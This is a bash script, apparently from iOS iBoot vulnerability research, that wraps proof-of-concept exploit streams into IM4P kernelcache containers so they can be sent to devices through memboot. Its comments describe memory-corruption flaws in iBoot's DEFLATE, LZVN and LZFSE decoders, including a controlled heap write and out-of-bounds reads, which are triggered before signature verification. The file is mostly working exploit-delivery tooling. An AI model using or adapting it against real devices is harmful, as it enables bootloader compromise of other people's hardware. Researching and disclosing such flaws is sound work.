#!/bin/bash
# make_payloads.sh — wrap the report PoC streams into IM4P 'krnl' containers for memboot send.
# The memboot chain decodes the payload BEFORE emitting "Kernelcache image not valid"
# (IBEC_IBSS_24A435.md §2) - so the decoder runs on attacker bytes at send+bootx.
set -eu
cd "$(dirname "$0")"
command -v ipsw >/dev/null || { echo "need ipsw (brew install ipsw)"; exit 1; }

SRC=../..   # ReportN folders live in ios26.6iboot-bugs/, two levels up from payloads/
# control: the REAL bvx2 payload extracted from iBoot.v59.RELEASE.im4p in this device's own
# restore IPSW. bootx('krnl') decodes it CLEAN through the dispatcher, then fails the
# kernelcache check => zero-risk live proof of decode-before-verdict ORDER on retail silicon.
# (extract once: unzip "$IPSW" Firmware/all_flash/iBoot.v59.RELEASE.im4p ; then
#  python3 -c "d=open('iBoot.v59.RELEASE.im4p','rb').read();i=d.find(b'bvx2');open('control_bvx2.bin','wb').write(d[i:])")
[ -f control_bvx2.bin ] || { echo "missing control_bvx2.bin - see comment above to extract"; exit 1; }
ipsw img4 im4p create --type krnl --compress none --output control_krnl.im4p control_bvx2.bin

# Report 1 - DEFLATE stored-block overflow (37 B stream, 16,368 B controlled write)
cp "$SRC/Report1_DEFLATE/poc_205_stored.bin" . 2>/dev/null || true
ipsw img4 im4p create --type krnl --compress none --output r1_deflate_krnl.im4p poc_205_stored.bin

# Report 2 - LZVN cap overrun
cp "$SRC/Report2_LZVN/poc_v0.bin" . 2>/dev/null || true
ipsw img4 im4p create --type krnl --compress none --output r2_lzvn_krnl.im4p poc_v0.bin

# Report 3 - LZFSE bvx1 match-copier (leak + fault variants)
cp "$SRC/Report3_LZFSE/poc_lzfse_oobread.bin" "$SRC/Report3_LZFSE/poc_lzfse_fault.bin" . 2>/dev/null || true
ipsw img4 im4p create --type krnl --compress none --output r3_lzfseleak_krnl.im4p poc_lzfse_oobread.bin
ipsw img4 im4p create --type krnl --compress none --output r3_lzfseflt_krnl.im4p poc_lzfse_fault.bin

ls -la *.im4p
echo "verify readback:"; ipsw img4 im4p info r1_deflate_krnl.im4p
